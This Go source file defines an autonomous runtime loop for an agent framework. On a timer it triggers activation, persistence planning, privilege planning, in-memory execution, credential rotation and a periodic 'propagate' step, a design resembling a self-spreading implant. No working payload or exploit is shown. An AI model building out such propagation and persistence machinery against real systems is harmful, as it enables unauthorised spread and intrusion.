package agent

import (
	"context"
	"log/slog"
	"time"

	"github.com/naviNBRuas/APA/pkg/networking"
)

// AutonomousActions defines callbacks for the autonomous decision loop.
type AutonomousActions struct {
	OnActivate      func(ctx context.Context, state ActivationState) error
	OnPropagate     func(ctx context.Context) error
	OnAdapt         func(ctx context.Context, snapshot map[string]interface{}) error
	OnCredentialRotate func(ctx context.Context) error
}

// AdvancedRuntime bundles higher-order behaviors (triggers, autonomy, orchestration, retention).
type AdvancedRuntime struct {
	logger       *slog.Logger
	orchestrator *NativeOrchestrator
	memoryExec   MemoryExecutor
	transformer  *TransformationManager
	inspector    EnvInspector
	triggers     TriggerConditions
	stateMachine *AutonomousStateMachine
	vault        *CredentialVault
	persistence  PersistencePlanner
	privPlanner  PrivilegePlanner
	messenger    *networking.EncryptedMessenger
	actions      AutonomousActions
}

func NewAdvancedRuntime(logger *slog.Logger, eng *TransformationManager, messenger *networking.EncryptedMessenger) *AdvancedRuntime {
	return &AdvancedRuntime{
		logger:       logger,
		orchestrator: NewNativeOrchestrator(nil),
		memoryExec:   MemoryExecutor{},
		transformer:  eng,
		inspector:    EnvInspector{},
		triggers:     TriggerConditions{Cooldown: time.Minute},
		stateMachine: NewAutonomousStateMachine(TaskBudget{}),
		vault:        NewCredentialVault(),
		persistence:  PersistencePlanner{},
		privPlanner:  PrivilegePlanner{},
		messenger:    messenger,
	}
}

// SetActions configures callbacks for the autonomous decision loop.
func (ar *AdvancedRuntime) SetActions(actions AutonomousActions) {
	ar.actions = actions
}

// Run periodically evaluates triggers and autonomy decisions; kept lightweight and side-effect minimal.
func (ar *AdvancedRuntime) Run(ctx context.Context, peerCount func() int) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	lastExec := time.Time{}
	executed := 0
	for {
		select {
		case <-ctx.Done():
			return
		case now := <-ticker.C:
			state := ActivationState{Now: now, PeerCount: peerCount(), LastExecution: lastExec, NetworkIdle: true}
			if ar.triggers.ShouldActivate(state) && ar.stateMachine.Tick(now, executed) {
				ar.vault.Put("heartbeat", "alive", time.Minute*5)
				if ar.actions.OnActivate != nil {
					if err := ar.actions.OnActivate(ctx, state); err != nil {
						ar.logger.Warn("Autonomous action failed", "error", err)
					}
				}
				snapshot := ar.inspector.Snapshot()
				ar.persistence.Plan(snapshot)
				if ar.actions.OnAdapt != nil {
					if err := ar.actions.OnAdapt(ctx, snapshot); err != nil {
						ar.logger.Warn("Autonomous adaptation failed", "error", err)
					}
				}
				lastExec = now
				executed++
			}
			if executed%5 == 0 && executed > 0 {
				if ar.actions.OnCredentialRotate != nil {
					if err := ar.actions.OnCredentialRotate(ctx); err != nil {
						ar.logger.Warn("Credential rotation failed", "error", err)
					}
				}
				plan := ar.privPlanner.Plan()
				ar.privPlanner.Execute(plan)
				ar.memoryExec.Execute(ar.orchestrator, ar.transformer, ar.inspector)
			}
			if executed%20 == 0 && executed > 0 {
				if ar.actions.OnPropagate != nil {
					if err := ar.actions.OnPropagate(ctx); err != nil {
						ar.logger.Warn("Autonomous propagation failed", "error", err)
					}
				}
			}
		}
	}
}
